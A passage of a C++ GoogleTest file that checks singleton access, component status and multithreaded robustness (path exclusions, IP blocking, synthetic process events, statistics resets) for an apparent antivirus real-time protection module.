    RT::FileSystemFilter& viaRTP =
        RT::RealTimeProtection::Instance().GetFileSystemFilter();
    RT::FileSystemFilter& direct = RT::FileSystemFilter::Instance();
    EXPECT_EQ(&viaRTP, &direct);
}

TEST_F(CrossComponentFixture, GetProcessCreationMonitor_SameAsDirectInstance) {
    RT::ProcessCreationMonitor& viaRTP =
        RT::RealTimeProtection::Instance().GetProcessCreationMonitor();
    RT::ProcessCreationMonitor& direct = RT::ProcessCreationMonitor::Instance();
    EXPECT_EQ(&viaRTP, &direct);
}

TEST_F(CrossComponentFixture, GetNetworkTrafficFilter_SameAsDirectInstance) {
    RT::NetworkTrafficFilter& viaRTP =
        RT::RealTimeProtection::Instance().GetNetworkTrafficFilter();
    RT::NetworkTrafficFilter& direct = RT::NetworkTrafficFilter::Instance();
    EXPECT_EQ(&viaRTP, &direct);
}

TEST_F(CrossComponentFixture, GetComponentStatus_FSF_NoCrash) {
    const RT::ComponentStatus s =
        RT::RealTimeProtection::Instance().GetComponentStatus(
            RT::ComponentType::FILE_SYSTEM_FILTER);
    // Without driver: must not be ERROR (no exception thrown and state coherent).
    EXPECT_NE(RT::ProtectionComponentState::ERROR, s.state);
}

TEST_F(CrossComponentFixture, GetComponentStatus_PCM_NoCrash) {
    const RT::ComponentStatus s =
        RT::RealTimeProtection::Instance().GetComponentStatus(
            RT::ComponentType::PROCESS_MONITOR);
    EXPECT_NE(RT::ProtectionComponentState::ERROR, s.state);
}

TEST_F(CrossComponentFixture, GetComponentStatus_NTF_NoCrash) {
    const RT::ComponentStatus s =
        RT::RealTimeProtection::Instance().GetComponentStatus(
            RT::ComponentType::NETWORK_FILTER);
    EXPECT_NE(RT::ProtectionComponentState::ERROR, s.state);
}

TEST_F(CrossComponentFixture, GetComponentHealth_ReturnsMapWithEntries) {
    const auto health =
        RT::RealTimeProtection::Instance().GetComponentHealth();
    EXPECT_FALSE(health.empty());
}

TEST_F(CrossComponentFixture, Concurrency_PathExclusion_8Threads_NoCrashOrDeadlock) {
    // 8 threads simultaneously add/remove path exclusions on RTP.
    constexpr int kThreads    = 8;
    constexpr int kIterations = 50;

    std::atomic<int> errors{ 0 };
    std::vector<std::thread> threads;
    threads.reserve(kThreads);

    for (int t = 0; t < kThreads; ++t) {
        threads.emplace_back([t, &errors]() {
            try {
                for (int i = 0; i < kIterations; ++i) {
                    std::wstring path = L"C:\\ConcurrentPath\\" +
                        std::to_wstring(t) + L"_" + std::to_wstring(i);
                    RT::RealTimeProtection::Instance().AddPathExclusion(path);
                    RT::RealTimeProtection::Instance().RemovePathExclusion(path);
                }
            } catch (...) {
                errors.fetch_add(1, std::memory_order_relaxed);
            }
        });
    }

    for (auto& th : threads) th.join();
    EXPECT_EQ(0, errors.load(std::memory_order_relaxed));
    RT::RealTimeProtection::Instance().ClearAllExclusions();
}

TEST_F(CrossComponentFixture, Concurrency_IPBlocking_8Threads_NoCrash) {
    // 8 threads simultaneously block/unblock IPs on NetworkTrafficFilter.
    constexpr int kThreads    = 8;
    constexpr int kIterations = 50;

    std::atomic<int> errors{ 0 };
    std::vector<std::thread> threads;
    threads.reserve(kThreads);

    for (int t = 0; t < kThreads; ++t) {
        threads.emplace_back([t, &errors]() {
            try {
                for (int i = 0; i < kIterations; ++i) {
                    // Use TEST-NET-3 (RFC 5737) — routable only in documentation.
                    const std::string ip = "203.0.113." +
                        std::to_string((t * kIterations + i) % 256);
                    RT::NetworkTrafficFilter::Instance().BlockIP(ip);
                    RT::NetworkTrafficFilter::Instance().UnblockIP(
                        RT::IPAddress::FromString(ip));
                }
            } catch (...) {
                errors.fetch_add(1, std::memory_order_relaxed);
            }
        });
    }

    for (auto& th : threads) th.join();
    EXPECT_EQ(0, errors.load(std::memory_order_relaxed));
}

TEST_F(CrossComponentFixture, Concurrency_PCM_OnProcessCreate_8Threads_NoCrash) {
    // 8 threads simultaneously inject synthetic process events.
    constexpr int kThreads    = 8;
    constexpr int kIterations = 25;

    std::atomic<int> errors{ 0 };
    std::vector<std::thread> threads;
    threads.reserve(kThreads);

    for (int t = 0; t < kThreads; ++t) {
        threads.emplace_back([t, &errors]() {
            try {
                for (int i = 0; i < kIterations; ++i) {
                    const uint32_t pid =
                        static_cast<uint32_t>(0x80000000 | (t << 16) | i);
                    RT::ProcessCreationMonitor::Instance().OnProcessCreate(
                        pid, L"C:\\Windows\\System32\\cmd.exe", 4u);
                    RT::ProcessCreationMonitor::Instance().OnProcessTerminate(
                        pid, 0u);
                }
            } catch (...) {
                errors.fetch_add(1, std::memory_order_relaxed);
            }
        });
    }

    for (auto& th : threads) th.join();
    EXPECT_EQ(0, errors.load(std::memory_order_relaxed));
}

TEST_F(CrossComponentFixture,
       Concurrency_GetStatistics_ResetStatistics_NoCrash)
{
    // Reader and writer running concurrently against RTP's atomic stats.
    constexpr int kIterations = 100;

    std::atomic<int> errors{ 0 };
    std::thread writer([&errors]() {
        try {
            for (int i = 0; i < kIterations; ++i) {
                RT::RealTimeProtection::Instance().ResetStatistics();
            }
        } catch (...) {
            errors.fetch_add(1, std::memory_order_relaxed);
        }
    });

    std::thread reader([&errors]() {
        try {
            for (int i = 0; i < kIterations; ++i) {
                const RT::RTPStatistics& s =
                    RT::RealTimeProtection::Instance().GetStatistics();
                [[maybe_unused]] const uint64_t v =
                    s.totalScans.load(std::memory_order_relaxed);
            }
        } catch (...) {
            errors.fetch_add(1, std::memory_order_relaxed);
        }
    });

    writer.join();
    reader.join();
    EXPECT_EQ(0, errors.load(std::memory_order_relaxed));
}

// ============================================================================
// MAIN
// ============================================================================
int main(int argc, char** argv) {
    ::testing::InitGoogleTest(&argc, argv);
    return RUN_ALL_TESTS();
}
